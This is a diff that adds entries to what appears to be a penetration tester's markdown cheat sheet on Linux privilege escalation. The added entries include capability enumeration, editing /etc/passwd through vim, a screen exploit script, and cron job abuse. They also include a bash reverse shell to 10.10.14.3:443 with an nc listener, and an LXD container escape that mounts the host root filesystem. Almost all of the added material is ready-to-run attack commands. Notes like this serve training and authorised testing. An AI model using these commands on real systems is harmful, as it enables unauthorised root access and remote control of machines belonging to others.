@@ -1686,9 +1686,62 @@ id
 ```
 
 ### Capabilities
-####
+#### Enumerate Capabilities
+```
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+```
+getcap -r / 2>/dev/null
+```
+#### Abusing vim - Remove x from root
+```
+/usr/bin/vim.basic /etc/passwd
+```
 
 ## Service-Based Privilege Escalation
+### Vulnerable Services
+#### Enumerate the Services and Find a PoC for a Vulnerable Service
+##### Screen
+```
+./screen_exploit.sh
+```
+### Cron Job Abuse
+#### Find Writeable Files or Directories
+```
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+```
+#### Enumerate Cron Jobs
+```
+cat /etc/crontab
+```
+#### Verify that cronjob is running with pspy
+```
+./pspy64 -pf -i 1000
+```
+#### You can add a reverse shell to an editable script
+```
+bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+```
+#### Start a listener on attacker machine
+```
+nc -lnvp 443
+```
+### Containters
+#### Identify Linux Daemon/Linux Container
+```
+id
+```
+#### Linux Daemond Import Image anf Deployment
+```
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+lxc image list
+lxc init ubuntutemp privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/bash
+```
+
+
 ## Linux Internals-Based Privilege Escalation
 ## Recent 0-Days
 ## Hardening Considerations
